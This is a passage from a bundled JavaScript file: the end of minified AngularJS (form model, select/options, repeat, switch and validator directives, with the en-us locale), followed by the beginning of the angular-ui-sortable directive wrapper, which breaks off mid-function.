b.$$createComment("end ngIf",f.ngIf);h={clone:d};a.enter(d,c.parent(),c)}):(l&&(l.remove(),l=null),k&&(k.$destroy(),k=null),h&&(l=ub(h.clone),a.leave(l).done(function(a){!1!==a&&(l=null)}),h=null))})}}}],Qe=["$templateRequest","$anchorScroll","$animate",function(a,b,d){return{restrict:"ECA",priority:400,terminal:!0,transclude:"element",controller:$.noop,compile:function(c,f){var e=f.ngInclude||f.src,g=f.onload||"",h=f.autoscroll;return function(c,f,m,n,p){var q=0,s,w,u,H=function(){w&&(w.remove(),
w=null);s&&(s.$destroy(),s=null);u&&(d.leave(u).done(function(a){!1!==a&&(w=null)}),w=u,u=null)};c.$watch(e,function(e){var m=function(a){!1===a||!v(h)||h&&!c.$eval(h)||b()},w=++q;e?(a(e,!0).then(function(a){if(!c.$$destroyed&&w===q){var b=c.$new();n.template=a;a=p(b,function(a){H();d.enter(a,null,f).done(m)});s=b;u=a;s.$emit("$includeContentLoaded",e);c.$eval(g)}},function(){c.$$destroyed||w!==q||(H(),c.$emit("$includeContentError",e))}),c.$emit("$includeContentRequested",e)):(H(),n.template=null)})}}}}],
gf=["$compile",function(a){return{restrict:"ECA",priority:-400,require:"ngInclude",link:function(b,d,c,f){na.call(d[0]).match(/SVG/)?(d.empty(),a(Zc(f.template,z.document).childNodes)(b,function(a){d.append(a)},{futureParentElement:d})):(d.html(f.template),a(d.contents())(b))}}}],Re=Ra({priority:450,compile:function(){return{pre:function(a,b,d){a.$eval(d.ngInit)}}}}),cf=function(){return{restrict:"A",priority:100,require:"ngModel",link:function(a,b,d,c){var f=d.ngList||", ",e="false"!==d.ngTrim,g=
e?S(f):f;c.$parsers.push(function(a){if(!x(a)){var b=[];a&&q(a.split(g),function(a){a&&b.push(e?S(a):a)});return b}});c.$formatters.push(function(a){if(C(a))return a.join(f)});c.$isEmpty=function(a){return!a||!a.length}}}},ob="ng-valid",Ud="ng-invalid",Va="ng-pristine",Rb="ng-dirty",qb=M("ngModel");Ob.$inject="$scope $exceptionHandler $attrs $element $parse $animate $timeout $q $interpolate".split(" ");Ob.prototype={$$initGetterSetters:function(){if(this.$options.getOption("getterSetter")){var a=
this.$$parse(this.$$attr.ngModel+"()"),b=this.$$parse(this.$$attr.ngModel+"($$$p)");this.$$ngModelGet=function(b){var c=this.$$parsedNgModel(b);y(c)&&(c=a(b));return c};this.$$ngModelSet=function(a,c){y(this.$$parsedNgModel(a))?b(a,{$$$p:c}):this.$$parsedNgModelAssign(a,c)}}else if(!this.$$parsedNgModel.assign)throw qb("nonassign",this.$$attr.ngModel,ya(this.$$element));},$render:w,$isEmpty:function(a){return x(a)||""===a||null===a||a!==a},$$updateEmptyClasses:function(a){this.$isEmpty(a)?(this.$$animate.removeClass(this.$$element,
"ng-not-empty"),this.$$animate.addClass(this.$$element,"ng-empty")):(this.$$animate.removeClass(this.$$element,"ng-empty"),this.$$animate.addClass(this.$$element,"ng-not-empty"))},$setPristine:function(){this.$dirty=!1;this.$pristine=!0;this.$$animate.removeClass(this.$$element,Rb);this.$$animate.addClass(this.$$element,Va)},$setDirty:function(){this.$dirty=!0;this.$pristine=!1;this.$$animate.removeClass(this.$$element,Va);this.$$animate.addClass(this.$$element,Rb);this.$$parentForm.$setDirty()},
$setUntouched:function(){this.$touched=!1;this.$untouched=!0;this.$$animate.setClass(this.$$element,"ng-untouched","ng-touched")},$setTouched:function(){this.$touched=!0;this.$untouched=!1;this.$$animate.setClass(this.$$element,"ng-touched","ng-untouched")},$rollbackViewValue:function(){this.$$timeout.cancel(this.$$pendingDebounce);this.$viewValue=this.$$lastCommittedViewValue;this.$render()},$validate:function(){if(!ga(this.$modelValue)){var a=this.$$lastCommittedViewValue,b=this.$$rawModelValue,
d=this.$valid,c=this.$modelValue,f=this.$options.getOption("allowInvalid"),e=this;this.$$runValidators(b,a,function(a){f||d===a||(e.$modelValue=a?b:void 0,e.$modelValue!==c&&e.$$writeModelToScope())})}},$$runValidators:function(a,b,d){function c(){var c=!0;q(k.$validators,function(d,f){var g=Boolean(d(a,b));c=c&&g;e(f,g)});return c?!0:(q(k.$asyncValidators,function(a,b){e(b,null)}),!1)}function f(){var c=[],d=!0;q(k.$asyncValidators,function(f,g){var h=f(a,b);if(!h||!y(h.then))throw qb("nopromise",
h);e(g,void 0);c.push(h.then(function(){e(g,!0)},function(){d=!1;e(g,!1)}))});c.length?k.$$q.all(c).then(function(){g(d)},w):g(!0)}function e(a,b){h===k.$$currentValidationRunId&&k.$setValidity(a,b)}function g(a){h===k.$$currentValidationRunId&&d(a)}this.$$currentValidationRunId++;var h=this.$$currentValidationRunId,k=this;(function(){var a=k.$$parserName||"parse";if(x(k.$$parserValid))e(a,null);else return k.$$parserValid||(q(k.$validators,function(a,b){e(b,null)}),q(k.$asyncValidators,function(a,
b){e(b,null)})),e(a,k.$$parserValid),k.$$parserValid;return!0})()?c()?f():g(!1):g(!1)},$commitViewValue:function(){var a=this.$viewValue;this.$$timeout.cancel(this.$$pendingDebounce);if(this.$$lastCommittedViewValue!==a||""===a&&this.$$hasNativeValidators)this.$$updateEmptyClasses(a),this.$$lastCommittedViewValue=a,this.$pristine&&this.$setDirty(),this.$$parseAndValidate()},$$parseAndValidate:function(){var a=this.$$lastCommittedViewValue,b=this;if(this.$$parserValid=x(a)?void 0:!0)for(var d=0;d<
this.$parsers.length;d++)if(a=this.$parsers[d](a),x(a)){this.$$parserValid=!1;break}ga(this.$modelValue)&&(this.$modelValue=this.$$ngModelGet(this.$$scope));var c=this.$modelValue,f=this.$options.getOption("allowInvalid");this.$$rawModelValue=a;f&&(this.$modelValue=a,b.$modelValue!==c&&b.$$writeModelToScope());this.$$runValidators(a,this.$$lastCommittedViewValue,function(d){f||(b.$modelValue=d?a:void 0,b.$modelValue!==c&&b.$$writeModelToScope())})},$$writeModelToScope:function(){this.$$ngModelSet(this.$$scope,
this.$modelValue);q(this.$viewChangeListeners,function(a){try{a()}catch(b){this.$$exceptionHandler(b)}},this)},$setViewValue:function(a,b){this.$viewValue=a;this.$options.getOption("updateOnDefault")&&this.$$debounceViewValueCommit(b)},$$debounceViewValueCommit:function(a){var b=this.$options.getOption("debounce");Y(b[a])?b=b[a]:Y(b["default"])&&(b=b["default"]);this.$$timeout.cancel(this.$$pendingDebounce);var d=this;0<b?this.$$pendingDebounce=this.$$timeout(function(){d.$commitViewValue()},b):this.$$scope.$root.$$phase?
this.$commitViewValue():this.$$scope.$apply(function(){d.$commitViewValue()})}};Vd({clazz:Ob,set:function(a,b){a[b]=!0},unset:function(a,b){delete a[b]}});var bf=["$rootScope",function(a){return{restrict:"A",require:["ngModel","^?form","^?ngModelOptions"],controller:Ob,priority:1,compile:function(b){b.addClass(Va).addClass("ng-untouched").addClass(ob);return{pre:function(a,b,f,e){var g=e[0];b=e[1]||g.$$parentForm;if(e=e[2])g.$options=e.$options;g.$$initGetterSetters();b.$addControl(g);f.$observe("name",
function(a){g.$name!==a&&g.$$parentForm.$$renameControl(g,a)});a.$on("$destroy",function(){g.$$parentForm.$removeControl(g)})},post:function(b,c,f,e){function g(){h.$setTouched()}var h=e[0];if(h.$options.getOption("updateOn"))c.on(h.$options.getOption("updateOn"),function(a){h.$$debounceViewValueCommit(a&&a.type)});c.on("blur",function(){h.$touched||(a.$$phase?b.$evalAsync(g):b.$apply(g))})}}}}}],Pb,Zg=/(\s+|^)default(\s+|$)/;Bc.prototype={getOption:function(a){return this.$$options[a]},createChild:function(a){var b=
!1;a=R({},a);q(a,function(d,c){"$inherit"===d?"*"===c?b=!0:(a[c]=this.$$options[c],"updateOn"===c&&(a.updateOnDefault=this.$$options.updateOnDefault)):"updateOn"===c&&(a.updateOnDefault=!1,a[c]=S(d.replace(Zg,function(){a.updateOnDefault=!0;return" "})))},this);b&&(delete a["*"],ae(a,this.$$options));ae(a,Pb.$$options);return new Bc(a)}};Pb=new Bc({updateOn:"",updateOnDefault:!0,debounce:0,getterSetter:!1,allowInvalid:!1,timezone:null});var ff=function(){function a(a,d){this.$$attrs=a;this.$$scope=
d}a.$inject=["$attrs","$scope"];a.prototype={$onInit:function(){var a=this.parentCtrl?this.parentCtrl.$options:Pb,d=this.$$scope.$eval(this.$$attrs.ngModelOptions);this.$options=a.createChild(d)}};return{restrict:"A",priority:10,require:{parentCtrl:"?^^ngModelOptions"},bindToController:!0,controller:a}},Se=Ra({terminal:!0,priority:1E3}),$g=M("ngOptions"),ah=/^\s*([\s\S]+?)(?:\s+as\s+([\s\S]+?))?(?:\s+group\s+by\s+([\s\S]+?))?(?:\s+disable\s+when\s+([\s\S]+?))?\s+for\s+(?:([$\w][$\w]*)|(?:\(\s*([$\w][$\w]*)\s*,\s*([$\w][$\w]*)\s*\)))\s+in\s+([\s\S]+?)(?:\s+track\s+by\s+([\s\S]+?))?$/,
$e=["$compile","$document","$parse",function(a,b,d){function c(a,b,c){function e(a,b,c,d,f){this.selectValue=a;this.viewValue=b;this.label=c;this.group=d;this.disabled=f}function f(a){var b;if(!q&&ta(a))b=a;else{b=[];for(var c in a)a.hasOwnProperty(c)&&"$"!==c.charAt(0)&&b.push(c)}return b}var n=a.match(ah);if(!n)throw $g("iexp",a,ya(b));var p=n[5]||n[7],q=n[6];a=/ as /.test(n[0])&&n[1];var s=n[9];b=d(n[2]?n[1]:p);var v=a&&d(a)||b,u=s&&d(s),w=s?function(a,b){return u(c,b)}:function(a){return la(a)},
x=function(a,b){return w(a,B(a,b))},t=d(n[2]||n[1]),z=d(n[3]||""),A=d(n[4]||""),K=d(n[8]),I={},B=q?function(a,b){I[q]=b;I[p]=a;return I}:function(a){I[p]=a;return I};return{trackBy:s,getTrackByValue:x,getWatchables:d(K,function(a){var b=[];a=a||[];for(var d=f(a),e=d.length,g=0;g<e;g++){var h=a===d?g:d[g],l=a[h],h=B(l,h),l=w(l,h);b.push(l);if(n[2]||n[1])l=t(c,h),b.push(l);n[4]&&(h=A(c,h),b.push(h))}return b}),getOptions:function(){for(var a=[],b={},d=K(c)||[],g=f(d),h=g.length,n=0;n<h;n++){var p=d===
g?n:g[n],q=B(d[p],p),r=v(c,q),p=w(r,q),u=t(c,q),I=z(c,q),q=A(c,q),r=new e(p,r,u,I,q);a.push(r);b[p]=r}return{items:a,selectValueMap:b,getOptionFromViewValue:function(a){return b[x(a)]},getViewValueFromOption:function(a){return s?Fa(a.viewValue):a.viewValue}}}}}var f=z.document.createElement("option"),e=z.document.createElement("optgroup");return{restrict:"A",terminal:!0,require:["select","ngModel"],link:{pre:function(a,b,c,d){d[0].registerOption=w},post:function(d,h,k,l){function m(a){var b=(a=t.getOptionFromViewValue(a))&&
a.element;b&&!b.selected&&(b.selected=!0);return a}function n(a,b){a.element=b;b.disabled=a.disabled;a.label!==b.label&&(b.label=a.label,b.textContent=a.label);b.value=a.selectValue}function p(){var a=t&&r.readValue();if(t)for(var b=t.items.length-1;0<=b;b--){var c=t.items[b];v(c.group)?Fb(c.element.parentNode):Fb(c.element)}t=y.getOptions();var d={};z&&h.prepend(r.emptyOption);t.items.forEach(function(a){var b;if(v(a.group)){b=d[a.group];b||(b=e.cloneNode(!1),A.appendChild(b),b.label=null===a.group?
"null":a.group,d[a.group]=b);var c=f.cloneNode(!1)}else b=A,c=f.cloneNode(!1);b.appendChild(c);n(a,c)});h[0].appendChild(A);s.$render();s.$isEmpty(a)||(b=r.readValue(),(y.trackBy||w?qa(a,b):a===b)||(s.$setViewValue(b),s.$render()))}var r=l[0],s=l[1],w=k.multiple;l=0;for(var u=h.children(),x=u.length;l<x;l++)if(""===u[l].value){r.hasEmptyOption=!0;r.emptyOption=u.eq(l);break}var z=!!r.emptyOption;D(f.cloneNode(!1)).val("?");var t,y=c(k.ngOptions,h,d),A=b[0].createDocumentFragment();r.generateUnknownOptionValue=
function(a){return"?"};w?(r.writeValue=function(a){var b=a&&a.map(m)||[];t.items.forEach(function(a){a.element.selected&&-1===Array.prototype.indexOf.call(b,a)&&(a.element.selected=!1)})},r.readValue=function(){var a=h.val()||[],b=[];q(a,function(a){(a=t.selectValueMap[a])&&!a.disabled&&b.push(t.getViewValueFromOption(a))});return b},y.trackBy&&d.$watchCollection(function(){if(C(s.$viewValue))return s.$viewValue.map(function(a){return y.getTrackByValue(a)})},function(){s.$render()})):(r.writeValue=
function(a){var b=t.selectValueMap[h.val()],c=t.getOptionFromViewValue(a);b&&b.element.removeAttribute("selected");c?(h[0].value!==c.selectValue&&(r.removeUnknownOption(),r.unselectEmptyOption(),h[0].value=c.selectValue,c.element.selected=!0),c.element.setAttribute("selected","selected")):z?r.selectEmptyOption():r.unknownOption.parent().length?r.updateUnknownOption(a):r.renderUnknownOption(a)},r.readValue=function(){var a=t.selectValueMap[h.val()];return a&&!a.disabled?(r.unselectEmptyOption(),r.removeUnknownOption(),
t.getViewValueFromOption(a)):null},y.trackBy&&d.$watch(function(){return y.getTrackByValue(s.$viewValue)},function(){s.$render()}));z&&(r.emptyOption.remove(),a(r.emptyOption)(d),8===r.emptyOption[0].nodeType?(r.hasEmptyOption=!1,r.registerOption=function(a,b){""===b.val()&&(r.hasEmptyOption=!0,r.emptyOption=b,r.emptyOption.removeClass("ng-scope"),s.$render(),b.on("$destroy",function(){r.hasEmptyOption=!1;r.emptyOption=void 0}))}):r.emptyOption.removeClass("ng-scope"));h.empty();p();d.$watchCollection(y.getWatchables,
p)}}}}],Te=["$locale","$interpolate","$log",function(a,b,d){var c=/{}/g,f=/^when(Minus)?(.+)$/;return{link:function(e,g,h){function k(a){g.text(a||"")}var l=h.count,m=h.$attr.when&&g.attr(h.$attr.when),n=h.offset||0,p=e.$eval(m)||{},r={},s=b.startSymbol(),v=b.endSymbol(),u=s+l+"-"+n+v,H=$.noop,y;q(h,function(a,b){var c=f.exec(b);c&&(c=(c[1]?"-":"")+P(c[2]),p[c]=g.attr(h.$attr[b]))});q(p,function(a,d){r[d]=b(a.replace(c,u))});e.$watch(l,function(b){var c=parseFloat(b),f=ga(c);f||c in p||(c=a.pluralCat(c-
n));c===y||f&&ga(y)||(H(),f=r[c],x(f)?(null!=b&&d.debug("ngPluralize: no rule defined for '"+c+"' in "+m),H=w,k()):H=e.$watch(f,k),y=c)})}}}],Ue=["$parse","$animate","$compile",function(a,b,d){var c=M("ngRepeat"),f=function(a,b,c,d,f,m,n){a[c]=d;f&&(a[f]=m);a.$index=b;a.$first=0===b;a.$last=b===n-1;a.$middle=!(a.$first||a.$last);a.$odd=!(a.$even=0===(b&1))};return{restrict:"A",multiElement:!0,transclude:"element",priority:1E3,terminal:!0,$$tlb:!0,compile:function(e,g){var h=g.ngRepeat,k=d.$$createComment("end ngRepeat",
h),l=h.match(/^\s*([\s\S]+?)\s+in\s+([\s\S]+?)(?:\s+as\s+([\s\S]+?))?(?:\s+track\s+by\s+([\s\S]+?))?\s*$/);if(!l)throw c("iexp",h);var m=l[1],n=l[2],p=l[3],r=l[4],l=m.match(/^(?:(\s*[$\w]+)|\(\s*([$\w]+)\s*,\s*([$\w]+)\s*\))$/);if(!l)throw c("iidexp",m);var s=l[3]||l[1],v=l[2];if(p&&(!/^[$a-zA-Z_][$a-zA-Z0-9_]*$/.test(p)||/^(null|undefined|this|\$index|\$first|\$middle|\$last|\$even|\$odd|\$parent|\$root|\$id)$/.test(p)))throw c("badident",p);var u,w,x,t,y={$id:la};r?u=a(r):(x=function(a,b){return la(b)},
t=function(a){return a});return function(a,d,e,g,l){u&&(w=function(b,c,d){v&&(y[v]=b);y[s]=c;y.$index=d;return u(a,y)});var m=W();a.$watchCollection(n,function(e){var g,n,r=d[0],u,y=W(),z,D,E,B,F,C,I;p&&(a[p]=e);if(ta(e))F=e,n=w||x;else for(I in n=w||t,F=[],e)va.call(e,I)&&"$"!==I.charAt(0)&&F.push(I);z=F.length;I=Array(z);for(g=0;g<z;g++)if(D=e===F?g:F[g],E=e[D],B=n(D,E,g),m[B])C=m[B],delete m[B],y[B]=C,I[g]=C;else{if(y[B])throw q(I,function(a){a&&a.scope&&(m[a.id]=a)}),c("dupes",h,B,E);I[g]={id:B,
scope:void 0,clone:void 0};y[B]=!0}for(u in m){C=m[u];B=ub(C.clone);b.leave(B);if(B[0].parentNode)for(g=0,n=B.length;g<n;g++)B[g].$$NG_REMOVED=!0;C.scope.$destroy()}for(g=0;g<z;g++)if(D=e===F?g:F[g],E=e[D],C=I[g],C.scope){u=r;do u=u.nextSibling;while(u&&u.$$NG_REMOVED);C.clone[0]!==u&&b.move(ub(C.clone),null,r);r=C.clone[C.clone.length-1];f(C.scope,g,s,E,v,D,z)}else l(function(a,c){C.scope=c;var d=k.cloneNode(!1);a[a.length++]=d;b.enter(a,null,r);r=d;C.clone=a;y[C.id]=C;f(C.scope,g,s,E,v,D,z)});m=
y})}}}}],Ve=["$animate",function(a){return{restrict:"A",multiElement:!0,link:function(b,d,c){b.$watch(c.ngShow,function(b){a[b?"removeClass":"addClass"](d,"ng-hide",{tempClasses:"ng-hide-animate"})})}}}],Oe=["$animate",function(a){return{restrict:"A",multiElement:!0,link:function(b,d,c){b.$watch(c.ngHide,function(b){a[b?"addClass":"removeClass"](d,"ng-hide",{tempClasses:"ng-hide-animate"})})}}}],We=Ra(function(a,b,d){a.$watch(d.ngStyle,function(a,d){d&&a!==d&&q(d,function(a,c){b.css(c,"")});a&&b.css(a)},
!0)}),Xe=["$animate","$compile",function(a,b){return{require:"ngSwitch",controller:["$scope",function(){this.cases={}}],link:function(d,c,f,e){var g=[],h=[],k=[],l=[],m=function(a,b){return function(c){!1!==c&&a.splice(b,1)}};d.$watch(f.ngSwitch||f.on,function(c){for(var d,f;k.length;)a.cancel(k.pop());d=0;for(f=l.length;d<f;++d){var s=ub(h[d].clone);l[d].$destroy();(k[d]=a.leave(s)).done(m(k,d))}h.length=0;l.length=0;(g=e.cases["!"+c]||e.cases["?"])&&q(g,function(c){c.transclude(function(d,e){l.push(e);
var f=c.element;d[d.length++]=b.$$createComment("end ngSwitchWhen");h.push({clone:d});a.enter(d,f.parent(),f)})})})}}}],Ye=Ra({transclude:"element",priority:1200,require:"^ngSwitch",multiElement:!0,link:function(a,b,d,c,f){a=d.ngSwitchWhen.split(d.ngSwitchWhenSeparator).sort().filter(function(a,b,c){return c[b-1]!==a});q(a,function(a){c.cases["!"+a]=c.cases["!"+a]||[];c.cases["!"+a].push({transclude:f,element:b})})}}),Ze=Ra({transclude:"element",priority:1200,require:"^ngSwitch",multiElement:!0,link:function(a,
b,d,c,f){c.cases["?"]=c.cases["?"]||[];c.cases["?"].push({transclude:f,element:b})}}),bh=M("ngTransclude"),af=["$compile",function(a){return{restrict:"EAC",terminal:!0,compile:function(b){var d=a(b.contents());b.empty();return function(a,b,e,g,h){function k(){d(a,function(a){b.append(a)})}if(!h)throw bh("orphan",ya(b));e.ngTransclude===e.$attr.ngTransclude&&(e.ngTransclude="");e=e.ngTransclude||e.ngTranscludeSlot;h(function(a,c){var d;if(d=a.length)a:{d=0;for(var e=a.length;d<e;d++){var g=a[d];if(g.nodeType!==
Ja||g.nodeValue.trim()){d=!0;break a}}d=void 0}d?b.append(a):(k(),c.$destroy())},null,e);e&&!h.isSlotFilled(e)&&k()}}}}],Ce=["$templateCache",function(a){return{restrict:"E",terminal:!0,compile:function(b,d){"text/ng-template"===d.type&&a.put(d.id,b[0].text)}}}],ch={$setViewValue:w,$render:w},dh=["$element","$scope",function(a,b){function d(){h||(h=!0,b.$$postDigest(function(){h=!1;e.ngModelCtrl.$render()}))}function c(a){k||(k=!0,b.$$postDigest(function(){b.$$destroyed||(k=!1,e.ngModelCtrl.$setViewValue(e.readValue()),
a&&e.ngModelCtrl.$render())}))}function f(a){a.prop("selected",!0);a.attr("selected",!0)}var e=this,g=new Qa;e.selectValueMap={};e.ngModelCtrl=ch;e.multiple=!1;e.unknownOption=D(z.document.createElement("option"));e.hasEmptyOption=!1;e.emptyOption=void 0;e.renderUnknownOption=function(b){b=e.generateUnknownOptionValue(b);e.unknownOption.val(b);a.prepend(e.unknownOption);f(e.unknownOption);a.val(b)};e.updateUnknownOption=function(b){b=e.generateUnknownOptionValue(b);e.unknownOption.val(b);f(e.unknownOption);
a.val(b)};e.generateUnknownOptionValue=function(a){return"? "+la(a)+" ?"};e.removeUnknownOption=function(){e.unknownOption.parent()&&e.unknownOption.remove()};e.selectEmptyOption=function(){e.emptyOption&&(a.val(""),f(e.emptyOption))};e.unselectEmptyOption=function(){e.hasEmptyOption&&e.emptyOption.removeAttr("selected")};b.$on("$destroy",function(){e.renderUnknownOption=w});e.readValue=function(){var b=a.val(),b=b in e.selectValueMap?e.selectValueMap[b]:b;return e.hasOption(b)?b:null};e.writeValue=
function(b){var c=a[0].options[a[0].selectedIndex];c&&c.removeAttribute("selected");e.hasOption(b)?(e.removeUnknownOption(),c=la(b),a.val(c in e.selectValueMap?c:b),f(D(a[0].options[a[0].selectedIndex]))):null==b&&e.emptyOption?(e.removeUnknownOption(),e.selectEmptyOption()):e.unknownOption.parent().length?e.updateUnknownOption(b):e.renderUnknownOption(b)};e.addOption=function(a,b){if(8!==b[0].nodeType){Pa(a,'"option value"');""===a&&(e.hasEmptyOption=!0,e.emptyOption=b);var c=g.get(a)||0;g.put(a,
c+1);d()}};e.removeOption=function(a){var b=g.get(a);b&&(1===b?(g.remove(a),""===a&&(e.hasEmptyOption=!1,e.emptyOption=void 0)):g.put(a,b-1))};e.hasOption=function(a){return!!g.get(a)};var h=!1,k=!1;e.registerOption=function(a,b,d,f,g){if(d.$attr.ngValue){var h,k=NaN;d.$observe("value",function(a){var d,f=b.prop("selected");v(k)&&(e.removeOption(h),delete e.selectValueMap[k],d=!0);k=la(a);h=a;e.selectValueMap[k]=a;e.addOption(a,b);b.attr("value",k);d&&f&&c()})}else f?d.$observe("value",function(a){e.readValue();
var d,f=b.prop("selected");v(h)&&(e.removeOption(h),d=!0);h=a;e.addOption(a,b);d&&f&&c()}):g?a.$watch(g,function(a,f){d.$set("value",a);var g=b.prop("selected");f!==a&&e.removeOption(f);e.addOption(a,b);f&&g&&c()}):e.addOption(d.value,b);d.$observe("disabled",function(a){if("true"===a||a&&b.prop("selected"))e.multiple?c(!0):(e.ngModelCtrl.$setViewValue(null),e.ngModelCtrl.$render())});b.on("$destroy",function(){var a=e.readValue(),b=d.value;e.removeOption(b);e.ngModelCtrl.$render();(e.multiple&&a&&
-1!==a.indexOf(b)||a===b)&&c(!0)})}}],De=function(){return{restrict:"E",require:["select","?ngModel"],controller:dh,priority:1,link:{pre:function(a,b,d,c){var f=c[0],e=c[1];if(e){if(f.ngModelCtrl=e,b.on("change",function(){f.removeUnknownOption();a.$apply(function(){e.$setViewValue(f.readValue())})}),d.multiple){f.multiple=!0;f.readValue=function(){var a=[];q(b.find("option"),function(b){b.selected&&!b.disabled&&(b=b.value,a.push(b in f.selectValueMap?f.selectValueMap[b]:b))});return a};f.writeValue=
function(a){var c=new Qa(a);q(b.find("option"),function(a){a.selected=v(c.get(a.value))||v(c.get(f.selectValueMap[a.value]))})};var g,h=NaN;a.$watch(function(){h!==e.$viewValue||qa(g,e.$viewValue)||(g=ra(e.$viewValue),e.$render());h=e.$viewValue});e.$isEmpty=function(a){return!a||0===a.length}}}else f.registerOption=w},post:function(a,b,d,c){var f=c[1];if(f){var e=c[0];f.$render=function(){e.writeValue(f.$viewValue)}}}}}},Ee=["$interpolate",function(a){return{restrict:"E",priority:100,compile:function(b,
d){var c,f;v(d.ngValue)||(v(d.value)?c=a(d.value,!0):(f=a(b.text(),!0))||d.$set("value",b.text()));return function(a,b,d){var k=b.parent();(k=k.data("$selectController")||k.parent().data("$selectController"))&&k.registerOption(a,b,d,c,f)}}}}],Tc=function(){return{restrict:"A",require:"?ngModel",link:function(a,b,d,c){c&&(d.required=!0,c.$validators.required=function(a,b){return!d.required||!c.$isEmpty(b)},d.$observe("required",function(){c.$validate()}))}}},Sc=function(){return{restrict:"A",require:"?ngModel",
link:function(a,b,d,c){if(c){var f,e=d.ngPattern||d.pattern;d.$observe("pattern",function(a){E(a)&&0<a.length&&(a=new RegExp("^"+a+"$"));if(a&&!a.test)throw M("ngPattern")("noregexp",e,a,ya(b));f=a||void 0;c.$validate()});c.$validators.pattern=function(a,b){return c.$isEmpty(b)||x(f)||f.test(b)}}}}},Vc=function(){return{restrict:"A",require:"?ngModel",link:function(a,b,d,c){if(c){var f=-1;d.$observe("maxlength",function(a){a=Z(a);f=ga(a)?-1:a;c.$validate()});c.$validators.maxlength=function(a,b){return 0>
f||c.$isEmpty(b)||b.length<=f}}}}},Uc=function(){return{restrict:"A",require:"?ngModel",link:function(a,b,d,c){if(c){var f=0;d.$observe("minlength",function(a){f=Z(a)||0;c.$validate()});c.$validators.minlength=function(a,b){return c.$isEmpty(b)||b.length>=f}}}}};z.angular.bootstrap?z.console&&console.log("WARNING: Tried to load angular more than once."):(ue(),xe($),$.module("ngLocale",[],["$provide",function(a){function b(a){a+="";var b=a.indexOf(".");return-1==b?0:a.length-b-1}a.value("$locale",
{DATETIME_FORMATS:{AMPMS:["AM","PM"],DAY:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ERANAMES:["Before Christ","Anno Domini"],ERAS:["BC","AD"],FIRSTDAYOFWEEK:6,MONTH:"January February March April May June July August September October November December".split(" "),SHORTDAY:"Sun Mon Tue Wed Thu Fri Sat".split(" "),SHORTMONTH:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),STANDALONEMONTH:"January February March April May June July August September October November December".split(" "),
WEEKENDRANGE:[5,6],fullDate:"EEEE, MMMM d, y",longDate:"MMMM d, y",medium:"MMM d, y h:mm:ss a",mediumDate:"MMM d, y",mediumTime:"h:mm:ss a","short":"M/d/yy h:mm a",shortDate:"M/d/yy",shortTime:"h:mm a"},NUMBER_FORMATS:{CURRENCY_SYM:"$",DECIMAL_SEP:".",GROUP_SEP:",",PATTERNS:[{gSize:3,lgSize:3,maxFrac:3,minFrac:0,minInt:1,negPre:"-",negSuf:"",posPre:"",posSuf:""},{gSize:3,lgSize:3,maxFrac:2,minFrac:2,minInt:1,negPre:"-\u00a4",negSuf:"",posPre:"\u00a4",posSuf:""}]},id:"en-us",localeID:"en_US",pluralCat:function(a,
c){var f=a|0,e=c;void 0===e&&(e=Math.min(b(a),3));Math.pow(10,e);return 1==f&&0==e?"one":"other"}})}]),D(function(){pe(z.document,Mc)}))})(window);!window.angular.$$csp().noInlineStyle&&window.angular.element(document.head).prepend('<style type="text/css">@charset "UTF-8";[ng\\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>');
//# sourceMappingURL=angular.min.js.map
/*
 jQuery UI Sortable plugin wrapper

 @param [ui-sortable] {object} Options to pass to $.fn.sortable() merged onto ui.config
 */
angular.module('ui.sortable', [])
  .value('uiSortableConfig',{
    // the default for jquery-ui sortable is "> *", we need to restrict this to
    // ng-repeat items
    // if the user uses
    items: '> [ng-repeat],> [data-ng-repeat],> [x-ng-repeat]'
  })
  .directive('uiSortable', [
    'uiSortableConfig', '$timeout', '$log',
    function(uiSortableConfig, $timeout, $log) {
      return {
        require: '?ngModel',
        scope: {
          ngModel: '=',
          uiSortable: '='
        },
        link: function(scope, element, attrs, ngModel) {
          var savedNodes;

          function combineCallbacks(first, second){
            var firstIsFunc = typeof first === 'function';
            var secondIsFunc = typeof second === 'function';
            if(firstIsFunc && secondIsFunc) {
              return function() {
                first.apply(this, arguments);
                second.apply(this, arguments);
              };
            } else if (secondIsFunc) {
              return second;
            }
            return first;
          }

          function getSortableWidgetInstance(element) {
            // this is a fix to support jquery-ui prior to v1.11.x
            // otherwise we should be using `element.sortable('instance')`
            var data = element.data('ui-sortable');
            if (data && typeof data === 'object' && data.widgetFullName === 'ui-sortable') {
              return data;
            }
            return null;
          }

          function patchSortableOption(key, value) {
            if (callbacks[key]) {
              if( key === 'stop' ){
                // call apply after stop
                value = combineCallbacks(
                  value, function() { scope.$apply(); });

                value = combineCallbacks(value, afterStop);
              }
              // wrap the callback
              value = combineCallbacks(callbacks[key], value);
            } else if (wrappers[key]) {
              value = wrappers[key](value);
            }

            // patch the options that need to have values set
            if (!value && (key === 'items' || key === 'ui-model-items')) {
              value = uiSortableConfig.items;
            }

            return value;
          }

          function patchUISortableOptions(newVal, oldVal, sortableWidgetInstance) {
            function addDummyOptionKey(value, key) {
              if (!(key in opts)) {
                // add the key in the opts object so that
                // the patch function detects and handles it
                opts[key] = null;
              }
            }
            // for this directive to work we have to attach some callbacks
            angular.forEach(callbacks, addDummyOptionKey);

            // only initialize it in case we have to
            // update some options of the sortable
            var optsDiff = null;

            if (oldVal) {
              // reset deleted options to default
              var defaultOptions;
              angular.forEach(oldVal, function(oldValue, key) {
                if (!newVal || !(key in newVal)) {
                  if (key in directiveOpts) {
                    if (key === 'ui-floating') {
                      opts[key] = 'auto';
                    } else {
                      opts[key] = patchSortableOption(key, undefined);
                    }
                    return;
                  }
                  
                  if (!defaultOptions) {
                    defaultOptions = angular.element.ui.sortable().options;
                  }
                  var defaultValue = defaultOptions[key];
                  defaultValue = patchSortableOption(key, defaultValue);

                  if (!optsDiff) {
                    optsDiff = {};
                  }
                  optsDiff[key] = defaultValue;
                  opts[key] = defaultValue;
                }
              });
            }

            // update changed options
            angular.forEach(newVal, function(value, key) {
              // if it's a custom option of the directive,
              // handle it approprietly
              if (key in directiveOpts) {
                if (key === 'ui-floating' && (value === false || value === true) && sortableWidgetInstance) {
                  sortableWidgetInstance.floating = value;
                }

                opts[key] = patchSortableOption(key, value);
                return;
              }

